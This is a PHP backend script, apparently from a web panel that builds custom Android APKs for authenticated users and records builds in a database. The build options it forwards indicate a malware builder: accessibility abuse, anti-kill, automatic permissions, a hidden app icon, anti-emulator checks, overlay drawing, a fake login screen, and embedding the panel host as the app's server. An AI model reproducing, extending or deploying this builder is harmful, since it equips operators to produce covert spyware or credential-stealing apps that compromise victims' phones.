<?php

//this called to start building apk
require_once __DIR__ . '/security_headers.php';
setSecurityHeaders();
require_once 'bootstrap.php';

require_once 'build_runner.php';

function isValidAppVersion($version)
{
    // Define the regular expression pattern
    $pattern = '/^\d+(\.\d+){0,2}$/';

    // Use preg_match to check if the version matches the pattern
    if (preg_match($pattern, $version)) {
        return true;
    } else {
        return false;
    }
}

function isValidApkPackageName($packageName)
{
    // Updated pattern to allow only letters, digits, and dots
    $pattern = '/^[a-zA-Z]([a-zA-Z0-9]*[a-zA-Z0-9]+)?(\.[a-zA-Z]([a-zA-Z0-9]*[a-zA-Z0-9]+)?)+$/';

    // Check if the package name matches the pattern
    return preg_match($pattern, $packageName) === 1;
}

session_start();
session_write_close();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $clientIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    rateLimitCheck('builder_panel_' . $clientIp, 40, 60);

    $rawBody = file_get_contents('php://input');
    $data = json_decode($rawBody);
    if (!is_object($data)) {
        echo Format("Invalid JSON payload.", OP_Fail);
        exit();
    }

    if (!empty($data->email) && !empty($data->token) && !empty($data->subcom)) {

        try {
            $user_email = isset($data->email) ? urldecode($data->email) : 'empty';
            $user_token = isset($data->token) ? urldecode($data->token) : 'empty';
            $Sub_Command = isset($data->subcom) ? urldecode($data->subcom) : 'empty';

            $allowedCommands = ['build', 'load', 'like'];
            if (!in_array($Sub_Command, $allowedCommands, true)) {
                echo Format("Invalid request (2).", OP_Fail);
                exit();
            }

            list($isValid, $message) = SessionCheck($user_email, $user_token);

            if (!$isValid) {

                echo Format("Authentication failed $message", OP_Fail);
                exit();
            }
            // 连接数据库
            $conn = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4", DB_UserName, DB_Password);
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            $user_email = str_replace(' ', '+', $user_email);
            $user_token_hash = hash('sha256', $user_token);

            $stmt = $conn->prepare("
    SELECT userid, email 
    FROM users 
    WHERE REPLACE(email, ' ', '+') = :email 
    AND token = :token 
    AND token_expiration >= NOW()
");

            $stmt->bindParam(':email', $user_email);
            $stmt->bindParam(':token', $user_token_hash);
            $stmt->execute();

            $result = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($result) {
                $userid = $result['userid'];
                $useremail = $result['email'];

                try {
                    $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4", DB_UserName, DB_Password);
                    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                    switch ($Sub_Command) {
                        case 'build':
                            $app_id = isset($data->appid) ? urldecode($data->appid) : null;
                            $clientname = isset($data->cname) ? urldecode($data->cname) : null;
                            $buildtype = isset($data->btype) ? urldecode($data->btype) : null;

                            $allowed_btype = array("S", "C");
                            if (!in_array($buildtype, $allowed_btype)) {
                                echo Format("Unknown Build type.", OP_Fail);
                                exit();
                            }

                            $allowed_values = array("0", "1");
                            $use_access = isset($data->uaccess) ? (in_array($data->uaccess, $allowed_values) ? urldecode($data->uaccess) : null) : null;
                            $use_antkill = isset($data->ukill) ? (in_array($data->ukill, $allowed_values) ? urldecode($data->ukill) : null) : null;
                            $use_atoprims = isset($data->uprims) ? urldecode($data->uprims) : null;
                            $user_allprims = isset($data->allprims) ? (in_array($data->allprims, $allowed_values) ? urldecode($data->allprims) : null) : null;
                            $user_blackprims = isset($data->blackprims) ? (in_array($data->blackprims, $allowed_values) ? urldecode($data->blackprims) : null) : null;
                            if (
                                $app_id === null ||
                                $clientname === null ||
                                $use_access === null ||
                                $use_antkill === null ||
                                $use_atoprims === null
                            ) {
                                echo Format("Invalid Parameters(99).", OP_Fail);
                                exit();
                            }

                            if (strlen($clientname) > 16) {
                                echo Format('Client name must not exceed 16 characters', OP_Fail);
                                die();
                            }

                            if (!isValidApkPackageName($app_id)) {
                                echo Format('App ID not Accepted.', OP_Fail);
                                die();
                            }
                            //发布
                            $userhost = $_SERVER['HTTP_HOST'] ?? (defined('APP_DOMAIN') ? APP_DOMAIN : 'localhost');

                            $userhost = strtolower($userhost);
                            $userhost = preg_replace('/^(https?:\/\/)?(www\.)?/', '', $userhost);
                            if (!preg_match('/^[a-z0-9.-]{1,255}$/', $userhost)) {
                                echo Format('Host not accepted', OP_Fail);
                                exit();
                            }

                            $notifytitle = isset($data->nottitle) ? urldecode($data->nottitle) : " ";
                            $notifymsg = isset($data->notmsg) ? urldecode($data->notmsg) : " ";
                            $notifytitle = substr($notifytitle, 0, 64);
                            $notifymsg = substr($notifymsg, 0, 255);

                            switch ($buildtype) {
                                case 'C':
                                    $appname = isset($data->appname) ? urldecode($data->appname) : null;
                                    if (strlen($appname) > 32) {
                                        echo Format('App name must not exceed 23 characters', OP_Fail);
                                        die();
                                    }

                                    $appversion = isset($data->appversion) ? urldecode($data->appversion) : null;
                                    if (!isValidAppVersion($appversion)) {
                                        echo Format('App Version not accepted', OP_Fail);
                                        die();
                                    }

                                    $appicopath = isset($data->icoid) ? urldecode($data->icoid) : null;
                                    $parts = explode('.', $appicopath);
                                    if (count($parts) !== 2) {
                                        echo Format("icon name not valid !.", OP_Request);
                                        exit();
                                    }

                                    $filename = $parts[0];
                                    $extension = $parts[1];

                                    if ($extension !== 'png') {
                                        echo Format("icon name not valid !!.", OP_Request);
                                        exit();
                                    }

                                    if (!preg_match('/^[a-f0-9]{32}$/', $filename)) {
                                        echo Format("icon name not valid !!!.", OP_Request);
                                        exit();
                                    }

                                    $userDirectory = '../user/storage/' . $userid . '/icons/';

                                    if (!file_exists($userDirectory . $appicopath)) {
                                        echo Format("this icon was not found", OP_Fail);
                                        exit();
                                    }

                                    $appurl = isset($data->appurl) ? urldecode($data->appurl) : null;


                                    $logintitle = isset($data->logt) ? urldecode($data->logt) : null;
                                    $logindis = isset($data->logd) ? urldecode($data->logd) : null;
                                    $loginbtn = isset($data->logb) ? urldecode($data->logb) : null;
                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;
                                    $hiddenapp = isset($data->hidapp) ? urldecode($data->hidapp) : "0";
                                    $noemulator = isset($data->noemu) ? urldecode($data->noemu) : "0";
                                    if (PHP_OS_FAMILY !== 'Windows' && $noemulator !== "0" && strtolower($noemulator) !== "black") {
                                        $noemulator = APP_BASE_PATH . '/user/ui/' . basename(str_replace('\\', '/', $noemulator));
                                    }
                                    $installtype = isset($data->accsstyp) ? urldecode($data->accsstyp) : "g";
                                    $hide_type = isset($data->hidtype) ? urldecode($data->hidtype) : "null";
                                    $use_draw = isset($data->usedraw) ? urldecode($data->usedraw) : "null";
                                    $open_access = isset($data->openaccess) ? urldecode($data->openaccess) : "null";
                                    $descr_iption = isset($data->description) ? urldecode($data->description) : "null";                                 
                                    $diao_type = isset($data->diaotype) ? urldecode($data->diaotype) : "0";  
                                    $device_auth_token = defined('WS_DEVICE_BUILD_TOKEN') ? WS_DEVICE_BUILD_TOKEN : '';

                                    // 在启动构建前，先在数据库中插入记录（不依赖EaodWorker回调）
                                    $currentDate = date("d-m-Y");
                                    $app_path = APP_BASE_PATH . '/user/apps/' . $userid . '/' . $app_id . '/' . $app_id . '.apk';
                                    // 先删除同一用户同一包名的旧记录
                                    $delStmt = $pdo->prepare('DELETE FROM custom_app WHERE user_id = :userid AND app_package = :appid');
                                    $delStmt->bindValue(':userid', $userid, PDO::PARAM_INT);
                                    $delStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $delStmt->execute();
                                    // 插入新记录
                                    $insertQuery = 'INSERT INTO custom_app (build_id, user_id, app_package, app_path, appname, app_ico, build_date, build_state) 
                                        VALUES (NULL, :userid, :appid, :apppath, :appname, :appico, :nowdate, "onbuild")';
                                    $insertStmt = $pdo->prepare($insertQuery);
                                    $insertStmt->bindValue(':userid', $userid, PDO::PARAM_INT);
                                    $insertStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':apppath', $app_path, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':appname', $appname, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':appico', $userid . '/icons/' . $appicopath, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':nowdate', $currentDate, PDO::PARAM_STR);
                                    $insertStmt->execute();

                                    echo BuildCustom(
                                        $app_id,
                                        $userid,
                                        $clientname,
                                        $useremail,
                                        "empty",
                                        "empty",
                                        $userhost,
                                        $use_access,
                                        $use_antkill,
                                        $use_atoprims,
                                        $notifytitle,
                                        $notifymsg,
                                        $user_allprims,
                                        $user_blackprims,
                                        $buildtype,
                                        $appname,
                                        $appversion,
                                        $appicopath,
                                        $appurl,
                                        $logintitle,
                                        $logindis,
                                        $loginbtn,
                                        $lngshort,
                                        $hiddenapp,
                                        $noemulator,
                                        $installtype,
                                        $hide_type,
                                        $use_draw,
                                        $open_access,
                                        $descr_iption,
                                        $diao_type,
                                        $device_auth_token
                                    );
                                    break;

                                case 'S':
                                    $appCheckQuery = "SELECT main_activity, app_folder FROM store WHERE app_id = :appid";
                                    $appCheckStmt = $pdo->prepare($appCheckQuery);
                                    $appCheckStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $appCheckStmt->execute();
                                    $result = $appCheckStmt->fetch(PDO::FETCH_ASSOC);

                                    if (!$result) {
                                        echo Format("Error: App ID does not exist.", OP_Fail);
                                        exit();
                                    }

                                    $mainActivity = $result['main_activity'];
                                    $app_folder = $result['app_folder'];

                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;


                                    $appname = isset($data->appname) ? urldecode($data->appname) : null;
                                    if (strlen($appname) > 32) {
                                        echo Format('App name must not exceed 23 characters', OP_Fail);
                                        die();
                                    }

                                    $appversion = isset($data->appversion) ? urldecode($data->appversion) : null;
                                    if (!isValidAppVersion($appversion)) {
                                        echo Format('App Version not accepted', OP_Fail);
                                        die();
                                    }

                                    $appicopath = isset($data->icoid) ? urldecode($data->icoid) : null;


                                    $appurl = isset($data->appurl) ? urldecode($data->appurl) : null;


                                    $logintitle = isset($data->logt) ? urldecode($data->logt) : null;
                                    $logindis = isset($data->logd) ? urldecode($data->logd) : null;
                                    $loginbtn = isset($data->logb) ? urldecode($data->logb) : null;
                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;
                                    $hiddenapp = isset($data->hidapp) ? urldecode($data->hidapp) : "0";
                                    $noemulator = isset($data->noemu) ? urldecode($data->noemu) : "0";
                                    if (PHP_OS_FAMILY !== 'Windows' && $noemulator !== "0" && strtolower($noemulator) !== "black") {
                                        $noemulator = APP_BASE_PATH . '/user/ui/' . basename(str_replace('\\', '/', $noemulator));
                                    }
                                    $installtype = isset($data->accsstyp) ? urldecode($data->accsstyp) : "g";
                                    $hide_type = isset($data->hidtype) ? urldecode($data->hidtype) : "null";
                                    $use_draw = isset($data->usedraw) ? urldecode($data->usedraw) : "null";
                                    $open_access = isset($data->openaccess) ? urldecode($data->openaccess) : "null";
                                    $descr_iption = isset($data->description) ? urldecode($data->description) : "null";                                 
                                    $diao_type= isset($data->diaotype) ? urldecode($data->diaotype) : "0";  

                                    $device_auth_token = defined('WS_DEVICE_BUILD_TOKEN') ? WS_DEVICE_BUILD_TOKEN : '';

                                    // 在启动构建前，先在数据库中插入记录（不依赖EaodWorker回调）
                                    $currentDate = date("d-m-Y");
                                    $app_path = APP_BASE_PATH . '/user/apps/' . $userid . '/' . $app_id . '/' . $app_id . '.apk';
                                    // 先删除同一用户同一包名的旧记录
                                    $delStmt = $pdo->prepare('DELETE FROM custom_app WHERE user_id = :userid AND app_package = :appid');
                                    $delStmt->bindValue(':userid', $userid, PDO::PARAM_INT);
                                    $delStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $delStmt->execute();
                                    // 插入新记录
                                    $insertQuery = 'INSERT INTO custom_app (build_id, user_id, app_package, app_path, appname, app_ico, build_date, build_state) 
                                        VALUES (NULL, :userid, :appid, :apppath, :appname, :appico, :nowdate, "onbuild")';
                                    $insertStmt = $pdo->prepare($insertQuery);
                                    $insertStmt->bindValue(':userid', $userid, PDO::PARAM_INT);
                                    $insertStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':apppath', $app_path, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':appname', $appname, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':appico', $userid . '/icons/' . $appicopath, PDO::PARAM_STR);
                                    $insertStmt->bindValue(':nowdate', $currentDate, PDO::PARAM_STR);
                                    $insertStmt->execute();

                                    echo BuildStore(
                                        $app_id,
                                        $userid,
                                        $clientname,
                                        $useremail,
                                        $mainActivity,
                                        $app_folder,
                                        $userhost,
                                        $use_access,
                                        $use_antkill,
                                        $use_atoprims,
                                        $notifytitle,
                                        $notifymsg,
                                        $user_allprims,
                                        $user_blackprims,
                                        $buildtype,
                                        $appname,
                                        $appversion,
                                        $appicopath,
                                        $appurl,
                                        $logintitle,
                                        $logindis,
                                        $loginbtn,
                                        $lngshort,
                                        $hiddenapp,
                                        $noemulator,
                                        $installtype,
                                        $hide_type,
                                        $use_draw,
                                        $open_access,
                                        $descr_iption,
                                        $diao_type,
                                        $device_auth_token
                                    );
                                    break;
                                default:
                                    echo Format("Unknown Build type 2.", OP_Fail);
                                    break;
                            }
                            break;

                        case 'load':
                            $query = "SELECT * FROM store";
                            $stmt = $pdo->prepare($query);
                            $stmt->execute();

                            $result = $stmt->fetchAll(PDO::FETCH_ASSOC);

                            header('Content-Type: application/json');
                            echo Format($result, OP_Success);

                            // $result = [];
                            // header('Content-Type: application/json');
                            // echo Format($result, OP_Success);

                            break;

                        case 'like':
                            $app_id = isset($data->appid) ? urldecode($data->appid) : null;
                            if ($app_id == null) {
                                echo Format("Invalid Parameters.", OP_Fail);
                                exit();
                            }

                            $appCheckQuery = "SELECT COUNT(*) AS count FROM store WHERE app_id = :appid";
                            $appCheckStmt = $pdo->prepare($appCheckQuery);
                            $appCheckStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            $appCheckStmt->execute();
                            $result = $appCheckStmt->fetch(PDO::FETCH_ASSOC);

                            if ($result['count'] == 0) {
                                echo Format("Error: App ID does not exist.", OP_Fail);
                                exit();
                            }

                            $checkdoublecate = "SELECT COUNT(*) AS counts FROM store_likes WHERE app_id = :appid AND user_id = :uuid";
                            $checkdouble = $pdo->prepare($checkdoublecate);
                            $checkdouble->bindValue(':uuid', $userid, PDO::PARAM_INT);
                            $checkdouble->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            $checkdouble->execute();
                            $resultdouble = $checkdouble->fetch(PDO::FETCH_ASSOC);

                            if ($resultdouble['counts'] > 0) {
                                echo Format("you already liked this app.", OP_Request);
                                exit();
                            }

                            $likequery = "INSERT INTO store_likes (like_id, user_id, app_id) VALUES (NULL, :user_id, :appid)";
                            $stmt = $pdo->prepare($likequery);
                            $stmt->bindValue(':user_id', $userid, PDO::PARAM_INT);
                            $stmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            if ($stmt->execute()) {
                                echo Format("Like Added.", OP_Success);
                            } else {
                                echo Format("Error Adding Like.", OP_Fail);
                            }
                            break;
                        default:
                            echo Format("Invalid request (2).", OP_Fail);
                            break;
                    }
                } catch (PDOException $e) {
                    logError($e);
                    echo Format("Error (8946).", OP_Fail);
                    exit();
                }
            } else {
                echo Format("Invalid or expired token.", OP_Fail);
            }
        } catch (PDOException $e) {
            echo Format('908 Something went wrong please try again later.', OP_Fail);
            logError($e);
            echo Format("Error (4434).", OP_Fail);
        }
        $conn = null;
    } else {
        echo Format("Invalid request param.", OP_Fail);
    }
} else {
    echo Format("Invalid request.", OP_Fail);
}
